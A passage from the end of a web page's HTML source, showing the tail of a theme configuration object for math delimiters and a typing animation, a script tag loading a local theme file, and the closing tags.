ft":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
</html>
